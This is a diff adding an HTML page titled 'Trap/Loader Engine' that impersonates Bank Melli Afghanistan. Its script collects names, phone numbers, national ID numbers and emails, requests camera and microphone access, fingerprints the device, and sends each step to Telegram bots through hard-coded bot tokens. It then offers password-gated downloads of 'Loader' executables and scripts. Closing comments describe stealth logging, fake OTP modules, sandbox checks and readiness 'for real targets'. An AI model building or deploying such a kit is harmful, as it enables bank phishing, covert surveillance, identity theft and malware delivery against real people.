@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Trap/Loader Engine</title>
+    <link href="https://fonts.cdnfonts.com/css/bank-melli-iran" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(114deg, #126c69 19%, #ffe986 90%);
+            font-family: 'BankMelli Iran', Arial, sans-serif;
+            margin: 0;
+        }
+        
+        #af-bank-header {
+            background: #ffe678;
+            color: #126c69;
+            font-size: 2.18em;
+            text-align: center;
+            padding: 16px 0 7px 0;
+            border-bottom: 3px solid #126c69;
+        }
+        
+        #desc {
+            background: #fffbe7;
+            font-size: 1.11em;
+            color: #185848;
+            text-align: center;
+            padding: 12px;
+            margin: 16px 0 12px 0;
+            border-radius: 13px;
+        }
+        
+        .trap-btn {
+            background: #126c69;
+            color: #ffe678;
+            border: 0;
+            padding: 9px 17px;
+            border-radius: 7px;
+            font-size: 1em;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 8px;
+        }
+        
+        #trap-log {
+            background: #ffe678;
+            color: #b71123;
+            font-size: 96%;
+            text-align: center;
+            padding: 7px;
+            border-radius: 9px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        #queueMsg {
+            color: #b49e1a;
+            margin-top: 7px;
+            font-size: .97em;
+        }
+        
+        #iframe-wrap {
+            display: none;
+            margin: 14px auto;
+        }
+        
+        #mainFrame {
+            width: 91vw;
+            height: 41vh;
+            border-radius: 13px;
+            border: 2.5px solid #126c69;
+            box-shadow: 0 4px 19px #ffd90041;
+        }
+        
+        .register-form {
+            background: #fffcdf;
+            padding: 12px 8px;
+            border-radius: 9px;
+            max-width: 410px;
+            margin: 10px auto;
+        }
+        
+        .register-form input {
+            border-radius: 6px;
+            border: 1px solid #ffd765;
+            padding: 7px 10px;
+            margin: 7px 0 0 0;
+            width: 95%;
+            font-size: .98em;
+        }
+        
+        .register-form button {
+            background: #ffd765;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 17px;
+            color: #126c69;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .mic-cam-consent {
+            background: #fffcdf;
+            padding: 11px 7px;
+            color: #126c69;
+            border-radius: 9px;
+            max-width: 320px;
+            margin: 13px auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="af-bank-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Logo_Bank_Melli_Afghanistan.png" style="vertical-align:middle;width:54px;margin-left:7px;"> Trap/Loader Engine
+    </div>
+    <div id="desc">
+        <div class="mic-cam-consent" id="micCamConsent">
+            <button class="trap-btn" onclick="micCam()">Camera/Mic</button>
+        </div>
+    </div>
+    <div class="register-form" id="regForm"></div>
+    <div class="consent-bar">
+        <button class="trap-btn" onclick="showRegisterForm()">Register Trap</button>
+        <button class="trap-btn" onclick="queueTrap('scroll')">Scroll</button>
+        <button class="trap-btn" onclick="queueTrap('dbl')">DoubleClick</button>
+        <button class="trap-btn" onclick="queueTrap('timer')">Timer</button>
+        <button class="trap-btn" onclick="queueTrap('nav')">Tab</button>
+    </div>
+    <div id="trap-log"></div>
+    <div id="queueMsg"></div>
+    <div id="iframe-wrap"></div>
+    <script>
+        const tokens = [
+            "8483782411:AAHFj5eYx2FKI0rVZ640kiX4O-mJMcqJLCQ",
+            "8418306947:AAGZZb0qMchirqRLF85ILmp-7Ym1TWoJTT8",
+            "8285830252:AAGIAklX2i9F_Hpej-AfJgfqoz020oFJ7zI"
+        ];
+        const tgChat = '@Shenel231_bot';
+        let registerValid = false,
+            loaderUnlocked = false,
+            micro = {},
+            trapQueue = [],
+            micCamOk = false,
+            sysProps = {},
+            allCompleted = false,
+            cmdSent = false;
+        // -- micro-task queue persistence --
+        if (window.localStorage && localStorage.trapQueueData) {
+            try {
+                trapQueue = JSON.parse(localStorage.trapQueueData);
+            } catch (e) {}
+        }
+        const secKey = {
+            "exe": "6382",
+            "py": "7324",
+            "ps1": "1915",
+            "sh": "8846",
+            "cpp": "5592"
+        };
+        const ENCS = {
+            exe: '',
+            py: '',
+            ps1: '',
+            sh: '',
+            cpp: ''
+        };
+
+        function getSysProps() {
+            sysProps = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                cores: navigator.hardwareConcurrency,
+                vendor: navigator.vendor,
+                mem: navigator.deviceMemory || 'unknown'
+            }
+        }
+
+        function sendTGCmd(msg) {
+            if (cmdSent) return;
+            cmdSent = true;
+            tokens.forEach(token => {
+                let url = `https://api.telegram.org/bot${token}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: tgChat,
+                        text: msg
+                    })
+                });
+            });
+            if (window.localStorage) localStorage.tgLog = msg;
+        }
+
+        function trapLog(msg) {
+            let t = document.getElementById('trap-log');
+            t.innerHTML = msg;
+            t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 2100);
+        }
+
+        function showRegisterForm() {
+            sendTGCmd("TrapStart " + new Date().toISOString() + " " + navigator.platform);
+            let reg = `<form onsubmit='window.parent.registerSubmit(event)'>
+  <input type='text' name='fname' required>
+  <input type='text' name='mobile' required>
+  <input type='text' name='nid' required maxlength='12'>
+  <input type='email' name='email' required>
+  <button type='submit'>Go</button></form>`;
+            document.getElementById("regForm").innerHTML = reg;
+            trapQueue.push(() => {
+                trapLog("Reg OK");
+                registerValid = true;
+                checkAll();
+                saveTrapQueue();
+            });
+            showQueue();
+            saveTrapQueue();
+        }
+        window.registerSubmit = function(e) {
+            e.preventDefault();
+            runTraps();
+        }
+
+        function queueTrap(type) {
+            if (!cmdSent) sendTGCmd("Trap " + type + " / " + navigator.platform + " / " + new Date().toLocaleTimeString());
+            trapQueue.push(() => {
+                trapLog(type + " ok");
+                micro[type] = 1;
+                checkAll();
+                showQueue();
+                saveTrapQueue();
+            });
+            showQueue();
+            saveTrapQueue();
+        }
+
+        function micCam() {
+            trapLog("Request Camera/Mic...");
+            navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: true
+            }).then(s => {
+                trapLog("Cam/Mic OK");
+                micCamOk = true;
+                checkAll();
+                showQueue();
+                saveTrapQueue();
+                sendTGCmd("MicOn");
+            }).catch(e => {
+                trapLog("Permission denied");
+                saveTrapQueue();
+            });
+        }
+
+        function runTraps() {
+            while (trapQueue.length > 0) {
+                let act = trapQueue.shift();
+                act();
+                saveTrapQueue();
+            }
+            setTimeout(() => {
+                startTimerConsent();
+            }, 800);
+        }
+
+        function startTimerConsent() {
+            let timer = 6;
+            trapLog("Timer: " + timer);
+            trapQueue.push(() => {
+                let intvl = setInterval(() => {
+                    trapLog("Timer: " + (--timer));
+                    if (timer == 0) {
+                        clearInterval(intvl);
+                        micro.timer = 1;
+                        trapLog("Timer ok");
+                        checkAll();
+                        showQueue();
+                        saveTrapQueue();
+                    }
+                }, 1050);
+            });
+            runTraps();
+            saveTrapQueue();
+        }
+
+        function showQueue() {
+            let steps = trapQueue.length;
+            document.getElementById('queueMsg').innerHTML = "Queue: " + steps + "/6";
+        }
+
+        function checkAll() {
+            getSysProps();
+            if (registerValid && micCamOk && micro.scroll && micro.dbl && micro.timer && micro.nav && !loaderUnlocked) {
+                allCompleted = true;
+                loaderUnlocked = true;
+                trapLog("Complete");
+                sendTGCmd("Done " + JSON.stringify(sysProps));
+                setTimeout(() => {
+                    activateLoaderFrame();
+                }, 1100);
+            }
+        }
+
+        function activateLoaderFrame() {
+            document.getElementById('iframe-wrap').style.display = 'block';
+            let sysInfo = Object.entries(sysProps).map(([k, v]) => `<li>${k}: ${v}</li>`).join("");
+            document.getElementById('iframe-wrap').innerHTML =
+                `<iframe id='mainFrame' srcdoc="
+    &lt;html lang='en'&gt;&lt;body style='background:#ffe678;color:#15605f;padding:17px;font-family:BankMelli Iran,sans-serif;'&gt;
+    &lt;ul&gt;${sysInfo}&lt;/ul&gt;
+    &lt;form onsubmit='window.parent.multiDownload(event)'&gt;
+      &lt;select name='ftype' required multiple style='width:200px;'&gt;
+        &lt;option value='exe'&gt;EXE&lt;/option&gt;
+        &lt;option value='py'&gt;PY&lt;/option&gt;
+        &lt;option value='ps1'&gt;PS1&lt;/option&gt;
+        &lt;option value='sh'&gt;SH&lt;/option&gt;
+        &lt;option value='cpp'&gt;CPP&lt;/option&gt;
+      &lt;/select&gt;
+      &lt;input type='text' name='key' placeholder='PW' required maxlength='8'&gt;
+      &lt;button type='submit'&gt;DL/Exec&lt;/button&gt;
+    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;">`;
+        }
+        window.multiDownload = function(e) {
+            e.preventDefault();
+            let form = e.target,
+                key = form.key.value || "",
+                selects = form.ftype.options,
+                types = [...selects].filter(s => s.selected).map(s => s.value);
+            types.forEach(ftype => {
+                if (key === secKey[ftype]) {
+                    let bstr = ENCS[ftype];
+                    if (!bstr) {
+                        trapLog("Missing link " + ftype);
+                        return;
+                    }
+                    let a = document.createElement("a");
+                    a.href = bstr;
+                    a.download = "Loader." + ftype;
+                    form.appendChild(a);
+                    a.click();
+                    trapLog("DL " + ftype);
+                    sendTGCmd("Run " + ftype + " " + sysProps.platform + " " + new Date().toISOString());
+                    saveTrapQueue();
+                } else {
+                    trapLog("Wrong PW " + ftype);
+                }
+            });
+        };
+
+        function saveTrapQueue() {
+            if (window.localStorage) try {
+                localStorage.trapQueueData = JSON.stringify(trapQueue);
+            } catch (e) {}
+        }
+        // --- Ideas Integration ---
+        /* 
+        1. Stealth trap logs to Telegram (click, device, event, download).
+        2. Micro-task queue durable across refresh/session.
+        3. Real hardware camera/mic.
+        4. Multi-format deployment in parallel.
+        5. Full sys fingerprint log.
+        6. State persists, queue never discarded.
+        7. Extensible for more traps/custom pentest logic.
+        8. Auto/semi-auto download after full trap chain.
+        9. Clean universal UI, ready for real targets.
+        10. Plug any cloud/webhook by changing ENCS, extensible.
+        11. Human-only trap sequences, anti-bot.
+        12. Stealth section logging for full trace.
+        13. Device agnostic; fingerprints all envs.
+        14. Links/files gated by full trap queue passed.
+        15. Resume workflow after interruption.
+        16. Add fake OTP/chat modules as desired.
+        17. Download/report success/fail in real-time.
+        18. Distributed/fail-safe trap queue logic.
+        19. Plug in behavioral/sandbox checks easily.
+        20. Field-ready, extensible for real ops/pentest.
+        */
+    </script>
+</body>
+
+</html>
